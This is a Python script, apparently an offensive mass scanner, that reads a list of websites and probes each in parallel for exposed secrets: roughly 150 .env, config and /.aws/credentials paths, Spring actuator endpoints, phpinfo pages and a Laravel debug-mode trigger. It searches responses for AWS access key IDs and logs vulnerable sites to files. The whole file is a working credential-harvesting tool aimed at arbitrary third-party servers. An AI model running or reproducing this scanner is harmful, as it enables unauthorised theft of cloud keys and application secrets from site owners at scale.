import multiprocessing as mp
import time
import requests
import os
import sys
from itertools import chain
from time import sleep
from functools import partial
from urllib3.util import parse_url
import re

class Ngentot():
    def __init__(self):
        self.headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        pass

    def __enter__(self):
        return self

    def __exit__(self, *args):
        pass

    def savefile(self,folder, filename, content):
        with open(folder + "/" +  filename, 'a') as f:
            f.write(content + "\n")
            f.close()

    def checkUrl(self, url):
        url = parse_url(url)
        scheme = url.scheme

        if not scheme:
            scheme = "http"

        url = "{}://{}".format(scheme, url.netloc)
        return url

    def phpinfomethod(self, urls):
        url = self.checkUrl(urls)
        resp = {
            "method" : "PHPInfo"
        }
        jembut = ['_profiler/phpinfo', 'phpinfo.php', 'phpinfo', 'info.php', 'php.ini', 'php.php', 'infophp.php', 'test.php', 'dashboard/phpinfo.php',
                        'php-info.php', 'linusadmin-phpinfo.php', 'infos.php', 'old_phpinfo.php', 'temp.php', 'time.php', 'phpversion.php', 'pinfo.php', 'i.php', 'asdf.php']
        try:
            urlcheck = False
            for path in jembut:
                if path in url:
                    urlcheck = url
                else:
                    urlcheck = "{}{}".format(url,path)
                r = requests.get(urlcheck, headers=self.headers, verify=False, allow_redirects=False, timeout = 5)
                if "PHP Variables" in r.text and "Environment" in r.text:
                    akey = re.search('([^A-Z0-9]|^)(AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{12,}',r.text)
                    if akey:
                        resp['url'] = urlcheck
                        resp['status'] = True
                        break
                else:
                    resp['url'] = urlcheck
                    resp['status'] = False
        except:
            resp['url'] = url
            resp['status'] = False
        return resp



    def envmethod(self, urls):
        url = self.checkUrl(urls)
        resp = {
            "method" : "Env"
        }
        jembut = [
    "/env.js",
	"/config.js",
	"/config/env.js",
	"/config/runtime-env.js",
	"/actuator/env",
	"/actuator;/env;",
	"/message-api/actuator/env",
    "/vendor/.env",
    "/.env",
    "/.env.txt",
    "/env.txt",
    "/.env.bak",
    "/.aws/credentials"
    "/phpinfo",
    "/phpinfo.php",
    "/aws.yml",
    "/info.php",
    "/config/aws.yml",
    "/.env.example",
    "/.env_old",
    "/vendor/.env.example",
    "/core/.env.example",
    "/config/.env.example",
    "/app/.env.example",
    "/web/.env.example",
    "/public/.env.example",
    "/en/.env.example",
    "/laravel/.env.example",
    "/api/.env.example",
    "/app/.env.example",
    "/app/frontend/.env.example",
    "/application/.env.example",
    "/awstats/.env.example",
    "/back-end/app/.env.example",
    "/backend/.env.example",
    "/backup/.env.example",
    "/bootstrap/.env.example",
    "/build/.env.example",
    "/core/.env.example",
    "/data/.env.example",
    "/database/.env.example",
    "/demo/.env.example",
    "/dev/.env.example",
    "/developer/.env.example",
    "/django_project_path/.env.example",
    "/docker/.env.example",
    "/docs/.env.example",
    "/en/.env.example",
    "/env/.env.example",
    "/environments/.env.example",
    "/example/.env.example",
    "/examples/.env.example",
    "/front-app/.env.example",
    "/front-empathy/.env.example",
    "/front-end/.env.example",
    "/front/.env.example",
    "/frontend/.env.example",
    "/js/.env.example",
    "/local/.env.example",
    "/log/.env.example",
    "/mail/.env.example",
    "/prod/.env.example",
    "/production/.env.example",
    "/pub/.env.example",
    "/public/.env.example",
    "/rest/.env.example",
    "/route/.env.example",
    "/src/.env.example",
    "/stag/.env.example",
    "/staging/.env.example",
    "/static/.env.example",
    "/stats/.env.example",
    "/storage/.env.example",
    "/system/.env.example",
    "/temp/.env.example",
    "/test/.env.example",
    "/tests/.env.example",
    "/thumb/.env.example",
    "/thumbs/.env.example",
    "/tmp/.env.example",
    "/vendor/.env.example",
    "/vendor/laravel/.env.example",
    "/web/.env.example",
    "/.env_bak",
    "/.env.suspected",
    "/.env.1",
    "/.env~",
    "/.env.example.1",
    "/.env.example.suspected",
    "/core/.env",
    "/config/.env",
    "/app/.env",
    "/web/.env",
    "/public/.env",
    "/en/.env",
    "/laravel/.env",
    "/api/.env",
    "/app/.env",
    "/app/frontend/.env",
    "/application/.env",
    "/awstats/.env",
    "/back-end/app/.env",
    "/backend/.env",
    "/backup/.env",
    "/bootstrap/.env",
    "/build/.env",
    "/core/.env",
    "/data/.env",
    "/database/.env",
    "/demo/.env",
    "/dev/.env",
    "/developer/.env",
    "/django_project_path/.env",
    "/docker/.env",
    "/docs/.env",
    "/en/.env",
    "/env/.env",
    "/environments/.env",
    "/example/.env",
    "/examples/.env",
    "/front-app/.env",
    "/front-empathy/.env",
    "/front-end/.env",
    "/front/.env",
    "/frontend/.env",
    "/js/.env",
    "/local/.env",
    "/log/.env",
    "/mail/.env",
    "/prod/.env",
    "/production/.env",
    "/pub/.env",
    "/public/.env",
    "/rest/.env",
    "/route/.env",
    "/src/.env",
    "/stag/.env",
    "/staging/.env",
    "/staging2/.env",
    "/static/.env",
    "/stats/.env",
    "/storage/.env",
    "/system/.env",
    "/temp/.env",
    "/test/.env",
    "/tests/.env",
    "/tmp/.env",
    "/vendor/.env",
    "/vendor/laravel/.env",
    "/web/.env",
    "/v1/.env",
    "/v2/.env",
    "/v1/.env.example",
    "/v2/.env.example",
    "/staging2/.env",
    "/staging2/.env.example",
    "/project/.env",
    "/project/.env.example",
    "_profiler/phpinfo",
    ".flaskenv", 
    "/config/config.js",
    "config/config.json",
    "config.inc.php"
	"/env.js",
	"/config.js",
	"/config/env.js",
	"/config/runtime-env.js",
	"/actuator/env",
	"/actuator;/env;",
	"/message-api/actuator/env",

            ]
        try:
            urlcheck = False
            for path in jembut:
                if path in url:
                    urlcheck = url
                else:
                    urlcheck = "{}{}".format(url,path)
                r = requests.get(urlcheck, headers=self.headers, verify=False, allow_redirects=False, timeout = 5)
                akey = re.search('([^A-Z0-9]|^)(AKIA|A3T|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{12,}',r.text)
                if akey:
                # if "APP_KEY" in r.text or "APP_NAME" in r.text or "APP_ENV" in r.text:
                    resp['url'] = urlcheck
                    resp['status'] = True
                    break
                else:
                    resp['url'] = urlcheck
                    resp['status'] = False
        except:
            resp['url'] = url
            resp['status'] = False
        return resp

    def debugmethod(self, urls):
        url = self.checkUrl(urls)
        resp = {
            "method" : "Debug",
            'url'    : url
        }
        try:
            r = requests.post(url, data={"0x[]":"0x0day"}, headers=self.headers, timeout=5, verify=False, allow_redirects=False)
            if "APP_KEY" in r.text or "APP_NAME" in r.text or "APP_ENV" in r.text:
                resp['status'] = True
            else:
                resp['status'] = False
        except:
            resp['status'] = False
        return resp

    def run(self, url, folder):
        list_method = {
            0: self.envmethod,
            1: self.debugmethod,
            2: self.phpinfomethod,
        }
        for method in list_method:
            eks = list_method[method](url)
            urlcheck = eks['url']
            if eks['status']:
                if eks['method'] == "Env":
                    print('\033[32;1m#\033[0m '+ urlcheck + ' | \033[32;1m ENV FOUND!\033[0m')
                    self.savefile(folder, "Env.txt", urlcheck)
                    break
                elif eks['method'] == "Debug":
                    print('\033[32;1m#\033[0m '+ urlcheck + ' | \033[32;1m DEBUG FOUND!\033[0m')
                    self.savefile(folder, "debug.txt", urlcheck)
                    break
                elif eks['method'] == "PHPInfo":
                    print('\033[32;1m#\033[0m '+ urlcheck + ' | \033[32;1m PHPInfo FOUND!\033[0m')
                    self.savefile(folder, "PHPInfo.txt", urlcheck)
                    break
            else:
                print('\033[32;1m#\033[0m ' + urlcheck + ' | \033[31;1mNot Vuln !!\033[0m')


if __name__ == '__main__':
    start_time = time.monotonic()
    def convertsecond(time):
        day = time // (24 * 3600)
        time = time % (24 * 3600)
        hour = time // 3600
        time %= 3600
        minutes = time // 60
        time %= 60
        seconds = time
        return " %d Day %d Hour %d Minutes %d Second" % (day, hour, minutes, seconds)
    total_cpu = mp.cpu_count()
    trit = total_cpu * 30
    cok = """
                       ____                          ,--. 
 ,--,     ,--,        ,'  , `.   ,---,              ,--.'| 
 |'. \   / .`|     ,-+-,.' _ |  '  .' \         ,--,:  : | 
 ; \ `\ /' / ;  ,-+-. ;   , || /  ;    '.    ,`--.'`|  ' : 
 `. \  /  / .' ,--.'|'   |  ;|:  :       \   |   :  :  | | 
  \  \/  / ./ |   |  ,', |  '::  |   /\   \  :   |   \ | : 
   \  \.'  /  |   | /  | |  |||  :  ' ;.   : |   : '  '; | 
    \  ;  ;   '   | :  | :  |,|  |  ;/  \   \'   ' ;.    ; 
   / \  \  \  ;   . |  ; |--' '  :  | \  \ ,'|   | | \   | 
  ;  /\  \  \ |   : |  | ,    |  |  '  '--'  '   : |  ; .' 
./__;  \  ;  \|   : '  |/     |  :  :        |   | '`--'   
|   : / \  \  ;   | |`-'      |  | ,'        '   : |       
;   |/   \  ' |   ;/          `--''          ;   |.'       
`---'     `--`'---'                          '---'         
                                                           
""".format(total_cpu, trit)
    for char in cok:
        sleep(0)
        sys.stdout.write(char)
        sys.stdout.flush()
    foldername = input(" Input Your Save Folder : ")
    if not os.path.exists(foldername):
        os.makedirs(foldername)
    try:
        
        listnya = input(" Input Your Enter Weblist : ")
    except:
        print("File Notfound ! ")
        exit()
    try:
        check = Ngentot()
        with open(listnya) as f:
            urls = f.read().splitlines()
            pool = mp.Pool(trit)
            pool.map_async(partial(check.run,folder=foldername),urls)
        f.close()
        pool.close()
        pool.join()
    except KeyboardInterrupt:
        print("CTRL+C Detect, Exiting Program !")
        exit()
    end_time = time.monotonic()
    print(convertsecond(end_time - start_time))
